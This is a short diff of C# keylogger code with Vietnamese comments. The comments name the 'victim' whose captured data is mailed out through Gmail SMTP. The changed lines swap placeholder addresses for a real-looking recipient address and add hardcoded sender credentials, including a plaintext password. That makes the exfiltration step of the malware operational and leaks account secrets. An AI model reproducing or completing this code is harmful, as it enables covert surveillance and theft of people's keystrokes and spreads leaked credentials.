@@ -261,7 +261,7 @@ namespace Windows_Application
                 SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com"); // Client dùng để gửi mail 
 
                 mail.From = new MailAddress("email@gmail.com");
-                mail.To.Add("email@gmail.com"); //Mail mà thông tin của victim được gửi về 
+                mail.To.Add("udg.long.18@gmail.com"); //Mail mà thông tin của victim được gửi về 
                 mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                 mail.Body = "Nội dung của victim\n" + "\n";
 
@@ -286,7 +286,7 @@ namespace Windows_Application
                 }
 
                 SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential("email@gmail.com", "password");// Tài khoản và mật khẩu của mình để gửi mail
+                SmtpServer.Credentials = new System.Net.NetworkCredential("thanhlong.udg@gmail.com", "ThanhLong18@");// Tài khoản và mật khẩu của mình để gửi mail
                 SmtpServer.EnableSsl = true;
 
 
